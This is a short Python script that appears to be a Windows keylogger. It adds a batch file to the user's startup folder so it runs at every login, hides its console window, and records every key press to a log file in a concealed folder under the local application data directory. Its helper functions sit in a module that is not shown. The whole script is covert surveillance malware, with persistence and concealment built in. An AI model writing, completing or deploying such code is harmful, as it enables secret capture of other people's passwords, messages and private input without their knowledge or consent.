#!/usr/bin/env python3

import os, sys
import winshell
from keyutil import *
import keyboard
import platform
# import time

thispath = os.path.abspath(__file__)
pypath = sys.executable
startup = winshell.startup()
applocal = os.getenv("LOCALAPPDATA")
logfolder = os.path.join(applocal, "klg")
fcount = filecount(logfolder)
logname = latestlog(fcount)

if platform.system() == "Windows" and not os.path.exists(f"{startup}\klg.bat"):
    newbat(thispath, pypath, startup)
    createfolder(logfolder)
    createlog(logfolder, "keydump.txt")

hidecmd()

while True:
    keybuffer =[]
    keystroke = keyboard.read_event()
    # time.sleep(60)
    keyname = keystroke.name
    if keystroke.event_type == keyboard.KEY_DOWN:
        OnKeyboardEvent(logfolder, logname, keyname)
